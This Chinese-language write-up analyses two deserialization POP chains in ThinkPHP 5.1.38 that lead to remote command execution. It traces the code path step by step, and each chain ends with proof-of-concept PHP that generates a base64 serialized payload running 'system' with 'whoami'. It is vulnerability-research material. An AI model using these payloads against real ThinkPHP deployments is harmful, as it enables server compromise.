## 环境
Thinkphp5.1.38
PHP7.3.4
## 触发条件
`__destruct`方法或者`__wakeup`方法
## 测试代码
## 源码分析
### 链条一
**漏洞起点文件**
`think\process\pipes\Windows.php`
`__destruct`触发`removeFiles`方法
`file_exists`会把传入的参数当作字符串处理，触发`__toString`魔术方法
全局搜索下`__toString`，跟进`think\model\concern\Conversion.php`下的`__toString`方法，调用`toJson`方法
跟进`toJson`方法，调用`toArray`方法，然后json格式返回。
跟进`toArray`方法，需要在`toArray`方法中寻找到`可控变量->方法(可控变量)`来触发`__call`魔术方法。
为什么需要`__call`方法呢？因为PHP为了避免当调用的方法不存在时产生错误，而意外的导致程序中止，所以使用 `__call`
方法来避免,而`__call`方法中又常利用`call_user_func`和`call_user_func_array`来进行动态调用，从而可能导致命令执行。`toArray`中的`$relation->visible($name)`正好符合这个条件。
首先进行`if
(!empty($this->append))`条件判断，变量`append`可控，然后跟进`getRelation`方法，位于`think\model\concern\RelationShip.php`中，只要传入的参数`$name`不为空，且不在`$this->ralation`中即可返回null。
跟进`getAttr`方法，位于`think\model\concern\Attribute.php`中，调用了`getData`方法。
跟进`getData`方法，位于`think\model\concern\Attribute.php`中，只要传入的参数`name`存在`$this->data`中，就返回`$this->data[$name]`，因为这里`name`,`$this->data`可控，所以返回值可控。
也就是`toArray`方法中的`ralation`变量可控，就可以符合`可控变量->方法(可控变量)`来触发`__call`魔术方法。寻找不存在`visible`方法且存在`__call`方法的类。
因为调用`__call`方法，第一个参数是不可控的，所以限制了挺多。最后找到了`think\Request.php`类下的`__call`方法
跟进`think\Request.php`下的`__call`方法。只要`$method`在`$this->hook`中就可以触发`call_user_func_array`，且两个参数都可控，但是`args`经过了`array_unshift`函数插入导致`args数组`的第一个值是不可控的，但是我们可以调用任何方法。TP5有个常用的RCE漏洞是`think\Request.php`中的`input`方法。
跟进`input`方法，我们知道这个RCE漏洞是实例化类的时候没有过滤，需要`$data`、`$filter`和`$name`可控，然后进入`filterValue`方法中执行了`call_user_func`导致了命令执行，但是这边`data`变量却不可控。寻找调用`input`方法的方法。
跟进`param`方法,位于`think\Request`中，但是这里的`$name`依旧不可控，继续寻找调用`param`方法的方法
跟进`isAjax`方法,位于`think\Request`中,`this->config['var_ajax']`变量可控，也就是`input`中的`name`可控。
但TP5的`request RCE`漏洞的`filter`参数是通过GET传入，但这边的`filter`我们又怎么控制呢？
最后我们跟进下`input`方法，看看如何触发命令执行。`getFilter`方法的返回值赋值给`$filter`变量
跟进`getFilter`方法，位于`think\Request`中。`$filter`来自`$this->filter`所以可控。
最后进入`array_walk_recusive`函数，触发我们熟悉的`filterValue`方法。
跟进`filterValue`方法，通过`call_user_func`触发命令执行。
**完整POP链条**
`think\process\pipes\Windows->__destruct()`->`think\process\pipes\Windows->__removeFiles()`->`file_exists()`->`think\model\Pivot->_toString()`->`think\model\Pivot->_toJson()`->`think\model\Pivot->_toArray()`->`think\Request->visible()`->`think\Request->__call`->`call_user_func_array()`->`think\Request->isAjax()`->`think\Request->param()`->`think\Request->input()`->`array_walk_recursive()`->`think\Request->filterValue()`->`call_user_func()`
**POC编写**
注：自 PHP 5.4.0 起，PHP 实现了代码复用的一个方法，称为 traits。Trait 不能通过它自身来实例化，通过在类中使用use
关键字，声明要组合的Trait名称。所以我们通过寻找找到了同时组合`model\concern\Conversion`和`model\concern\Attribute`类的`think\Model`类
而`think\Model`类又是抽象类，也是不能直接来实例化的，需要寻找它的继承类来实例化，来间接调用。最后找到了`think\model\Pivot`类
    filter = 'system';
                $this->param = ['whoami'];
                $this->hook = ['visible'=>[$this,'isAjax']];
                $this->config = ['var_ajax' => ''];
            }
        }
        abstract class Model{
            protected $append = [];
            private $data = [];
            function __construct()
            {
                $this->append = ['eas' => ['eas']];
                $this->data = ['eas' => new Request()];
            }
        }
    }
    namespace think\model{
        use think\Model;
        class Pivot extends Model{
        }
    }
    namespace think\process\pipes{
        use think\model\Pivot;
        class Pipes{}
        class Windows extends Pipes{
            private $files = [];
            function __construct(){
                $this->files = [new Pivot()];
            }
        }
    }
    namespace{
        echo base64_encode(serialize(new think\process\pipes\Windows()));
    }
### 链条二
漏洞点在`think\model\concern\Attribute`中`getAttr`方法中的`$closure($value,
$this->data)`
POP链条的前部分触发点和 **链条一** 一样，进入`getAttr`方法
跟进`getAttr`方法，`$value`的值由`getData`方法返回值决定，由链条一我们可以知道`$value`可控，然后就是`$closure`是由`$this->withAttr[$fieldName]`赋值，`$this->withAttr`可控，`$fieldName`由`Loader::parseName($name)`赋值。
跟进`Loader::parseName`方法，只是简单的过滤匹配，所以`fieldName`也是可控的，即`$closure`可控
**完整POP链条**
`think\process\pipes\Windows->__destruct()`->`think\process\pipes\Windows->__removeFiles()`->`file_exists()`->`think\model\Pivot->_toString()`->`think\model\Pivot->_toJson()`->`think\model\Pivot->_toArray()`->`think\model\Pivot->getAttr()`->`$closure($value,
$this->data)`
**POC编写**
注：在php中如果传入多余的参数时，会被函数忽略。
    withAttr = ['system' => 'system'];
                $this->data = ['system' => 'whoami'];
            }
        }
    }
    namespace think\model{
        use think\Model;
        class Pivot extends Model{
        }
    }
    namespace think\process\pipes{
        use think\model\Pivot;
        class Pipes{}
        class Windows extends Pipes{
            private $files = [];
            function __construct(){
                $this->files = [new Pivot()];
            }
        }
    }
    namespace{
        echo base64_encode(serialize(new think\process\pipes\Windows()));
    }
## 总结
往往一条比较长的反序列链条中，可以被触发的漏洞点不止一个。需要自己从`__destruct`方法开始一点点看过去。(方法比较笨，但不会错过每一个点)。当然每个人挖掘方式不一样，从`__destruct`开始是正着挖，有的师傅喜欢先定位危险函数如`call_user_func`，然后逆着挖。个人觉得正着挖比较好，逆着挖个人感觉对新手不太友好。